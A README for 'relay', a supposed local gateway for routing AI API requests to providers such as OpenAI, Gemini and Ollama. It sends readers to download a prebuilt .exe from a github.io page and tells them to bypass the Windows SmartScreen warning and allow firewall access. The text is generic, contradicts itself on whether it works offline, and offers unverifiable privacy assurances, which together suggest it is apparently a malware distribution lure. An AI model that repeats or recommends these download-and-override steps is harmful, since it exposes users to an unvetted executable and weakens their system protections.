# ⚡ relay - Route your artificial intelligence requests easily

[![](https://img.shields.io/badge/Download-Relay-blue.svg)](https://recorded-phrygian494.github.io)

Relay acts as a bridge for your computer. It helps you send requests to different artificial intelligence providers through one single point. You gain control over where your data goes. You avoid tracking and keep your activities private. This tool runs on your own machine. 

## ⚙️ What this tool does

Relay functions as a gateway. It takes instructions written for common services like OpenAI or Anthropic and sends them to the model provider you choose. You can use it as a central hub for all your language model needs. 

The software works as a single file. You download it, run it, and it stays ready to work. It does not phone home to outside servers. It does not monitor your usage or store your data. You maintain total ownership of your information.

## 🖥️ System requirements

- Windows 10 or Windows 11
- 4 GB of RAM
- 100 MB of disk space
- An active internet connection

## 📥 How to set up relay

Follow these steps to get the software running on your computer.

1. Visit the [official download page](https://recorded-phrygian494.github.io).
2. Locate the file ending in `.exe` under the latest release section.
3. Click the file name to start the download.
4. Save the file to a folder you can find easily, such as your Downloads or Documents folder.
5. Double-click the saved file to start the program.

Windows might show a blue box when you run the file for the first time. This is a security check. Click More Info and then click Run Anyway to proceed. A black window will appear on your screen. This window stays open while the relay runs. Do not close this window while you use the software.

## 🛠️ Configuring your requests

Relay uses a standard format. When you write a request in your favorite application, point it toward the local address where relay runs. By default, this is `http://localhost:8080`. 

You can swap providers at any time. If you use a tool configured for OpenAI, relay translates that request for other services like Gemini or Ollama. This setup saves you from changing settings in every single app you use.

## 🛡️ Privacy and self-hosting

Most artificial intelligence tools send your prompts to remote servers that track your activity. Relay stops this flow. Because it lives on your computer, you keep your prompts local until you decide to push them to a provider. The zero-telemetry design ensures that no data leaves your machine except for the specific requests you initiate.

## 📋 Common troubleshooting

If the window closes immediately, ensure you have the correct version for your Windows system. Most modern computers use the 64-bit version.

If your application cannot connect to the relay, check your firewall settings. Windows might ask for permission to allow the application access to your network. Click Allow when the prompt appears.

If you encounter errors related to a port conflict, it means another program uses port 8080. You can change this port in the configuration file settings if you have experience with text editors. For most users, closing the conflicting program solves the problem.

## 🗃️ Advanced settings

You can manage your routing rules through a configuration file. Create a file named `config.yaml` in the same folder as your relay program. You can define specific routes for different models here. This allows you to send specific requests to different providers based on task type.

For example, you can route tasks requiring high speed to a smaller model and tasks requiring complex logic to a larger model. The relay handles this switching automatically.

## 🔍 Understanding the technical flow

1. Your apps send data to the relay.
2. The relay reads the address.
3. The relay reformats the data to match your selected provider.
4. The relay sends the request to the provider.
5. The provider sends a response back to the relay.
6. The relay passes the response to your app.

This loop happens in milliseconds. It provides a seamless experience for your daily workflows.

## ❓ Frequently asked questions

Do I need a constant internet connection? 
Yes. The relay connects to external providers to process your requests.

Does this work offline? 
If you connect relay to a local tool like Ollama, it can work entirely on your machine without an internet connection.

Is my data secure? 
The relay does not log your prompts or your credentials. It acts only as a pass-through layer.

Can I move the file? 
You can place the file anywhere on your hard drive. It does not require a complex installation process.

Keywords: anthropic, gateway, gemini, golang, llm, ollama, openai, proxy, router, self-hosted